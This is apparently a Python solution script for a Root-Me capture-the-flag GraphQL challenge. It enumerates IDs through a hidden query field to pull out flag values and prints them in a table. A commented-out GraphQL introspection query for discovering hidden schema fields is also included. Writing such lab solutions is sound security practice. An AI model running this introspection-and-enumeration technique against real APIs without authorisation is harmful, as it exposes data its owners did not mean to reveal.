import requests
from prettytable import PrettyTable
from prettytable.colortable import ColorTable, Themes

# defined a URL variable that we will be  
url = "http://challenge01.root-me.org:59077/rocketql"
# Timeout for requests
TIMEOUT = 5
# Request body
body = lambda id: f""" 
    {{ 
        IAmNotHere(very_long_id: {id}) {{
            very_long_value
        }}
    }}
"""
#body = "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"

# Table setup
table_data = ColorTable(theme=Themes.OCEAN,padding_width=1)
table_data.field_names = ["id", "status", "Content"]
table_data.align["Content"] = "l" # align left by default is center

for i in range(1,50):
    try:
        response = requests.post(url=url, json={"query": body(i)}, timeout=TIMEOUT)  
        res = response.json()
        flag = ''
        if res['data']['IAmNotHere'] :
            flag = res['data']['IAmNotHere'][0]['very_long_value']
        table_data.add_row([i, response.status_code, flag])
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")

# Print the sorted table
print(table_data)


# graphql introspection
# https://www.vaadata.com/blog/graphql-api-vulnerabilities-common-attacks-and-security-tips/
# https://ivangoncharov.github.io/graphql-voyager/
